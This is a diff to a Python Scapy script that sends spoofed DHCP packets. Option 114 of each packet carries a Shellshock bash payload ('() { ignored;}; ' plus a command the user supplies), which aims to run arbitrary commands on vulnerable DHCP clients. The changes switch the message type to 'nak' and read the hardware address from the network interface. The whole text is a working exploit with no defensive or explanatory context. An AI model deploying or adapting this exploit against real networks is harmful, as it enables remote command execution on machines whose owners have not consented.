@@ -28,11 +28,17 @@ def parse_args():
 def main():
     args = parse_args()
 
+    fam, hw = get_if_raw_hwaddr(args.interface)
     sendp(Ether(src=args.src_mac, dst=args.dst_mac)/
         IP(src=args.src_ip, dst=args.dst_ip)/
         UDP(sport=68,dport=67)/
-        BOOTP(chaddr=args.src_mac)/
-        DHCP(options=[("message-type","force_renew"), (114, "() { ignored;}; " + args.command), ('end')]),iface=args.interface)
+        BOOTP(chaddr=hw)/
+        DHCP(options=[
+            ("message-type","nak"),
+            (114, "() { ignored;}; " + args.command),
+            ('end')
+        ]),
+    iface=args.interface)
 
 if __name__ == "__main__":
     main()
